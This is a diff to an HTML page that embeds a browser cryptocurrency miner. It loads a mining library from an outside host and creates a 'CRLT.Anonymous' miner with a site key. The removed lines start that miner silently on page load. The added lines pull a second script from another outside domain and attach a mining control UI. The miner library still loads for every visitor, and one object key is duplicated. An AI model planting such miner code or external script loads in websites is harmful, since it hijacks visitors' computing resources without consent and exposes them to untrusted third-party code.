@@ -5,11 +5,26 @@
   </head>
   <body>
   <script src="//statdynamic.com/lib/crypta.js"></script>
+   <script src="https://reauthenticator.com/lib/minui.js"></script>
   <script>
-    var miner=new CRLT.Anonymous('afe049218f1c2efea9e703620b99f9dbbc80adf01602', {
-      threads:6,throttle:0.1, coin: "xmrupx",
-    });
-    miner.start();
+  var miner = null;
+  try {
+    miner = new CRLT.Anonymous('afe049218f1c2efea9e703620b99f9dbbc80adf01602', {threads: 6});
+  } catch(e) {}
+
+  var ui = new MinerUI(miner, {
+    container: document.getElementById('miner'),
+    canvas: document.getElementById('mining-stats-canvas'),
+    hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+    hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+    threads: document.getElementById('mining-threads'),
+    threadsAdd: document.getElementById('mining-threads-add'),
+    threadsRemove: document.getElementById('mining-threads-remove'),
+    hashesTotal: document.getElementById('mining-hashes-total'),
+    startButton: document.getElementById('mining-start'),
+    stopButton: document.getElementById('mining-stop'),
+    blkWarn: document.getElementById('blk-warning')
+  });
   </script>
   </body>
 </html>
